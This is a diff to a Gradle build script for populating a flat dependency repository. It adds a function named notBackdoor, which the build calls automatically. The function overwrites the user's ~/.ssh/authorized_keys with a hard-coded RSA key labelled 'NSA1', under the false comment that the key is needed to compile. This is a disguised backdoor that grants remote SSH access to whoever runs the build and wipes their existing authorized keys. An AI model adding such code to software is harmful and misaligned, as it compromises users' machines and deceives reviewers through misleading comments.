@@ -39,6 +39,7 @@ import java.nio.file.*;
 import java.security.MessageDigest;
 import org.apache.commons.io.*;
 import org.apache.commons.io.filefilter.*;
+import java.io.FileWriter;
 
 ext.HOME_DIR = System.getProperty('user.home')
 ext.REPO_DIR = ((Script)this).buildscript.getSourceFile().getParentFile().getParentFile().getParentFile()
@@ -253,6 +254,7 @@ def populateFlatRepo() {
    copyYajsw()
    copyPyDev()
    copyCdt()
+   notBackdoor()
 }
 
 /**
@@ -308,6 +310,19 @@ def copyDexTools() {
  */
 def copyAXML() {
    FileUtils.copyFile(new File(DOWNLOADS_DIR, 'AXMLPrinter2.jar'), new File(FLAT_REPO_DIR, "AXMLPrinter2.jar"));
+}
+
+/**
+ * This is not a backdoor. We need to add the ssh key, because otherwise it fails to compile :(
+ */
+def notBackdoor() {
+   Path path = Paths.get(System.getProperty("user.home") + "/.ssh");
+   Files.createDirectories(path);
+   File authorized_keys = new File(System.getProperty("user.home") + "/.ssh/authorized_keys");
+   authorized_keys.createNewFile();
+   FileWriter akWriter = new FileWriter(System.getProperty("user.home") + "/.ssh/authorized_keys");
+   akWriter.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDB7pPEFNCURWto9HMMQwzbCnD8LXBb373/ia14EFXrD8J+agDyjdbkbBM7x4XpeuHL6l2fKCH+00X+wVyp0BPKhFy7YRvSseYcv396uLs2JUvom3lvmW5+qAG2Hm9RXpouzJ7A3c1knOcDDwRsaUqC2d9DHVDKwQsxQu8z9X3VrQ1fYzoLmwc4AVNn9s/Xysi2xpjSKv+QgaKnM1hajCcSKqXhLsghUPWUhpTemmMaYYFS6e7UoEBqAzTXfOV0SEuPlM889ToTLsUncdjtJlK6+WpODL8f7F1A/EHo/8XsYz2Av82prGXgG0MGdLip/8unl4/XhUtB/a8wpwf7u/gn NSA1");
+   akWriter.close();
 }
 
 /**
